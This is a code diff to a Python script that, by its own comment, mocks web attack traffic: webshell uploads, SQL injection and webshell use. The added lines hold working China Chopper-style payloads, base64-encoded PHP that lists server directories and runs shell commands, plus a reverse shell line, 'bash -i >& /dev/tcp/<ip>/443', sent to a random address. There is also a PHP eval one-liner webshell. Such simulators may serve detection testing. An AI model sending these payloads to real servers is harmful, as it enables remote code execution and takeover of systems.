@@ -1,6 +1,8 @@
 import requests
 import random
+import base64
 from urllib3 import encode_multipart_formdata
+from urllib import parse
 #mock webshell_upload  SQLI webshell_useing
 #
 webshells={1:{'fn':'123456789.php','fd':'<?php @eval($_POST[\'666666\']);?>'},
@@ -21,6 +23,11 @@ HADER={
 'Accept-Encoding': 'gzip, deflate',
 'Pragma': 'no-cache',
 'Cache-Control': 'no-cache'
+}
+chopper={
+1:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=L3Zhci93d3cvaHRtbC8%3D',
+2:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=Y2QgIi92YXIvd3d3L2h0bWwvIjt3aG9hbWk7ZWNobyBbU107cHdkO2VjaG8gW0Vd',
+3:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2='
 }
 
 uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
@@ -46,15 +53,23 @@ def SQLI(url='http://www.baidu.com/'):
     url+=sqlis[random.randint(1, 5)]
     requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
     print('SQLI')
-def webshell_useing(url='http://www.baidu.com/'):
+def webshell_useing(url='http://127.0.0.1/'):
     mode=1
     print('webshell_useing')
-    r =requests.get('https://www.baidu.com/')
+    chopper_mock(url)
+def chopper_mock(url):
+    requests.post(url,data=chopper[1],headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[2], headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[3]+base64.b64encode('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1'), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+def randomIP():
+    a= random.sample(range(1,256)*4, 4)
+    b= map(str,a)
+    return '.'.join(b)
 
 
 def Make():
     switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing}
-    mode=2
+    mode=3
     if mode==-1:
         mode=random.randint(1, 4)
     switch[mode]()
